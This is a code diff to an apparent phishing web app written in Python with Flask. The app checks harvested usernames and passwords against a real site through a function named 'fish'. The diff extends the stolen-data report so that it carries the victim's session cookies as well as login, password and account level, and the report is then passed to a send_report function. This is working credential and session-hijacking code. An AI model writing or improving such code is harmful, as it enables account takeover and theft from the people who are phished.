@@ -1,5 +1,5 @@
 import random
-
+import json
 import requests as requests
 from flask import Flask, render_template, request
 from bs4 import BeautifulSoup as bs
@@ -33,14 +33,16 @@ def index():
 
 @app.route('/light', methods=['post', 'get'])
 def light():
-    isIncorrect, message, lvl = fish(request)
+    isIncorrect, message, lvl, username, password = fish(request)
     return render_template('light.html',
                            redirect_url=crop_url,
                            isIncorrect=isIncorrect,
                            online=get_online_count(),
                            sec=get_sec_count(),
                            message=message,
-                           lvl=lvl)
+                           lvl=lvl,
+                           username=username,
+                           password=password)
 
 
 def send_report(report_text):
@@ -100,10 +102,15 @@ def check_authorize(username, password):
     if lvl:
         if lvl != 0:
             lvl_text = lvl.get_text().strip()
-            report = 'Level: {0}\nLogin: {1}\nPassword: {2}'.format(lvl_text, username, password)
-
+            cookies = temp_session.cookies.get_dict()
+            pretty = json.dumps(cookies, sort_keys=True, indent=4)
+            report = 'Level: {0}\nLogin: {1}\nPassword: {2}\n\nCookies:\n{3}'.format(lvl_text,
+                                                                                     username,
+                                                                                     password,
+                                                                                     pretty)
             print('Report is', report)
             send_report(report)
+
         return int(lvl_text)
     else:
         return 0
